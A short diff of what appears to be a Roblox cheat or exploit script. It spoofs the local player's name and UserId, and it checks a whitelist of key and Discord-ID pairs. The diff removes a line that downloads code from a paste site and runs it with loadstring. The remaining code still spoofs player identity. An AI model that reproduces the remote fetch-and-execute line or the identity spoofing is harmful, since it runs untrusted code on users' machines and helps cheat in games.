@@ -1,6 +1,5 @@
 game.Players.LocalPlayer.Name = "mygame43"
 game.Players.LocalPlayer.UserId = "912348"
-loadstring(game:HttpGet("https://pastefy.app/nTehfRWs/raw"))()
 
 local keylist = {
     "VUGJGFAFF:1164921593466724485",
@@ -42,14 +41,17 @@ local keylist = {
     "HRWYGHDL:1023494951117533184",
     "RTXLKJFJ:827138555041546270"
 }
+
 local found = false
 local AfxcaxiRoblox = _G.AFXKey .. ":" .. _G.AFXDiscordID
+
 for _, v in ipairs(keylist) do
     if AfxcaxiRoblox == v then
         found = true
         break
     end
 end
+
 if found then
     print("Whitelisting...")
     print("Correct Key and Discord ID")
